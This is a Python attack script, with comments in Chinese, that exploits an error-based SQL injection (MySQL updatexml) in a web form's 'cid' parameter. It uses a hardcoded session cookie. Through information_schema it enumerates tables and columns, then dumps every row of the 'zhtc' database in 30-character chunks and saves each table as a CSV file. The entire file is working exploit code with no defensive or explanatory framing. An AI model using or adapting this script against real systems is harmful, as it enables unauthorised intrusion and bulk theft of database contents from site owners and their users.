import time
import requests
import re
import csv
import binascii
a = 31
list_jq = []
for i in range(1,1500):
    list_jq.append(a)
    a += 30
print(list_jq)
cookies = {
        "PHPSESSID":"500d2d30de0cd3799227bd2ecb6b18bd"
}
pattern = r"'~.*'"

headers = {
    'Accept': '*/*',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'Connection': 'keep-alive',
    # 'Cookie': 's041e359f=2sackact0f7i8hs37o6ku1a4c7; page-limit=200',
    'Referer': 'url',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Microsoft Edge";v="120"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

def zhengze(html):
    ze = re.findall(pattern, html)
    ze = ''.join(ze)
    ze = ze.replace('~', '')
    ze = ze.replace("'", '')
    return ze
def obtain_data(sql):
    data = {
        f"cid": f"(SELECT 1 FROM (SELECT(updatexml(1,concat(0x7e,({sql}),0x7e),1)))YsCQ)",
        "page": 1,
        "price_sort": "",
        "producttype": 0,
        "keywords": "",
        "businessid": ""
    }
    try:
        response = requests.post("url",cookies=cookies, headers=headers,timeout=6,data=data)
        response_content = response.content.decode('utf-8')
        result = zhengze(response_content)
        response.close()
        return result
    except requests.exceptions.Timeout:
        print("请求超时，重新发送请求...")
        return obtain_data(sql)
    except requests.exceptions.ConnectionError:
        print("连接失败，重新发送请求...")
        return obtain_data(sql)

def string_to_hex(input_string):        #将字符串转化为16进制
    # 使用encode方法将字符串编码为字节流
    byte_string = input_string.encode()
    # 使用binascii.hexlify将字节流转换为十六进制表示
    hex_string = binascii.hexlify(byte_string).decode()
    return '0x'+hex_string

if __name__ == '__main__':
    table_list = []
    database = 'zhtc'
    database16 = string_to_hex(database)
    table_num_sql = f"select count(table_name) from information_schema.tables where table_schema=database() limit 0,1"
    table_num = int(obtain_data(table_num_sql))  # 求表的数量
    for i in range(0, table_num):
        table_len_sql = f"select length(table_name) from information_schema.tables where table_schema=database() limit {i},1"
        table_len = int(obtain_data(table_len_sql))  # 求出每张表的长度
        table_data_sql = f"select mid(table_name,1,30) from information_schema.tables where table_schema=database() limit {i},1"
        table_data = obtain_data(table_data_sql)  # 求出小于30长度表的名字
        table_count = int((table_len - 1) / 30)  # 判断循环几次
        print(table_count)
        for j in range(0, table_count):  # 将截取的值添加上
            table_jiequ_sql = f"select mid(table_name,{list_jq[j]},30) from information_schema.tables where table_schema=database() limit {i},1"
            table_jiequ = obtain_data(table_jiequ_sql)
            table_data = table_data + table_jiequ
        table_list.append(table_data)  # 将表名添加到列表中
        print("表名：", table_data)
        table_data16 = string_to_hex(table_data)    #将表名转化为16进制
        tabledata_list = []
        filename = f'E:/desktop/sql/zhtc_table/{table_data}.csv'
        with open(filename, mode='w', encoding='utf-8') as file:
            # 接着根据表名查询列名,首先计算当前表名中有多少列
            column_list = []
            column_num_sql = f"select count(column_name) from information_schema.columns where table_schema = {database16} AND table_name = {table_data16} limit 0,1"
            column_num = int(obtain_data(column_num_sql))
            # 根据列数遍历列名
            for a in range(0, column_num):
                column_data_sql = f"select mid(column_name,1,30) from information_schema.columns WHERE table_schema = {database16} AND table_name = {table_data16} limit {a},1"
                column_data = obtain_data(column_data_sql)  # 得出长度小于等于30的列名
                column_length_sql = f"select length(column_name) from information_schema.columns WHERE table_schema = {database16} AND table_name = {table_data16} limit {a},1"
                column_length = int(obtain_data(column_length_sql))
                column_count = int((column_length - 1) / 30)
                for b in range(0, column_count):  # 长度大于30的话
                    column_jiequ_sql = f"select mid(column_name,{list_jq[b]},30) from information_schema.columns WHERE table_schema = {database16} AND table_name = '{table_data}'{table_data16} limit {a},1"
                    column_jiequ = obtain_data(column_jiequ_sql)
                    column_data = column_data + column_jiequ
                column_list.append(column_data)  # 将列名添加到列表中
                print("列名：", column_data)

                # 接着根据列名来查数据，首先判断当前表中有行条数据
                data_len_sql = f"select count({column_list[0]}) from zhtc.{table_data} limit 0,1"
                time.sleep(1)
                data_len = int(obtain_data(data_len_sql))  # 求表中有多少行
                print("行数：", data_len)
                data_list = []
                data_list.append(column_data)  # 将列名添加在列表头
                for c in range(0, data_len):
                    data_data_sql = f"select+mid({column_data},1,30)+from+zhtc.{table_data}+limit+{c},1"
                    data_data = obtain_data(data_data_sql)  # 得到长度小于等于30的数据
                    data_length_sql = f"select+length({column_data})+from+zhtc.{table_data}+limit+{c},1"
                    data_length = obtain_data(data_length_sql)
                    if len(data_length) == 0:  # 判断是否为空
                        data_length = 0
                    else:
                        data_length = int(data_length)
                    data_count = int((data_length - 1) / 30)
                    if data_count > 0 :
                        print(f"截取:{data_count}次")
                    for d in range(0, data_count):
                        data_jiequ_sql = f"select+mid({column_data},{list_jq[d]},30)+from+zhtc.{table_data}+limit+{c},1"
                        data_jiequ = obtain_data(data_jiequ_sql)
                        data_data = data_data + data_jiequ
                    data_list.append(data_data)
                    print(f"{table_data}表{column_data}列，第{c}条数据已查询")
                print("列数据:", data_list)
                tabledata_list.append(data_list)
                # 将数据进行转置
            transposed_data = list(map(list, zip(*tabledata_list)))

            writer = csv.writer(file)
            # 遍历每个转置后的行数据，将其写入新行
            for row in transposed_data:
                writer.writerow(row)
        print("成功创建并写入CSV文件！")
        print(column_list)

